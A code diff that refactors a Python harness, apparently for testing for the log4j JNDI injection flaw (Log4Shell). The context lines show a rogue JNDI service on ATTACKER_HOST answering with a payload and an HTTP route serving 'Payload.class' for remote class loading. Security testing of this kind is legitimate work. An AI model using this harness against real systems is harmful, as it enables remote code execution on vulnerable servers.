@@ -106,7 +106,8 @@ class JNDI(services.Service):
         return response
 
     async def handler(self, reader, writer):
-        logging.info('{}:{} requested data, responding with payload...'.format(*reader._transport._sock.getpeername()))
+        socket = writer.get_extra_info('socket')
+        logging.info('{}:{} requested data, responding with payload...'.format(*socket.getpeername()))
         await reader.read(8096)
         writer.write(self.RESPONSE_HELLO)
         await asyncio.sleep(0.5)
@@ -182,19 +183,14 @@ if __name__ == '__main__':
         'COLLECTOR_PORT': config.COLLECTOR_PORT,
     }
 
-
     httpd = Server(address=context['ATTACKER_HOST'], port=context['ATTACKER_PORT'])
     httpd.add_route('/', 'Welcome')
     httpd.add_route('/send-requests', 'Sending requests...')
     httpd.add_route('/Payload.class', Server.payload)
     httpd.add_event('run', when=events.PathContains('send-requests'))
 
-    story = scenarios.Scenario(**context)
-    # story.set_proxy('http://127.0.0.1:8088')
-    story.set_headers({
-        'User-Agent': 'Automated log4j testing',
-    })
-    story.set_debug()
+    story = scenarios.Scenario(context=context, http_headers={'User-Agent': 'Automated log4j testing'}, debug=True)
+    # story = scenarios.Scenario(context=context, http_proxy='http://127.0.0.1:8088')
     story.add_service(httpd)
     for port in config.JNDI_PORTS:
         story.add_service(JNDI(address=context['ATTACKER_HOST'], port=port, context=context))
